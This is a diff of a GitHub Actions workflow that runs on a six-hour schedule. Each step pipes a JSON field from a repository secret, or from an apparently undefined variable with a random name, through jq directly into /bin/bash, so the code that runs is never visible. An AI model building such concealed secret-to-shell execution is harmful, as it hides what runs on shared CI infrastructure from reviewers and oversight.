@@ -3,20 +3,19 @@ name: shenerwei7651
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
+    - cron: '0 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shenerwei7651
         env:
-          msill07: ${{ secrets.msill07 }}
+          ko4: ${{ secrets.ko4 }}
         run: |
-          echo $msill07 | jq -r .pds0661 | /bin/bash
-          echo $izb05134 | jq -r .hjbnl45190 | /bin/bash
-          echo $k9 | jq -r .e6 | /bin/bash
-          echo $zlb5 | jq -r .sncde467 | /bin/bash
-          echo $sw7659 | jq -r .yik903 | /bin/bash
+          echo $ko4 | jq -r .fyvt29341 | /bin/bash
+          echo $qlvi1011 | jq -r .tmr648 | /bin/bash
+          echo $eero1603 | jq -r .ismw80853 | /bin/bash
+          echo $lv6117 | jq -r .w47 | /bin/bash
 
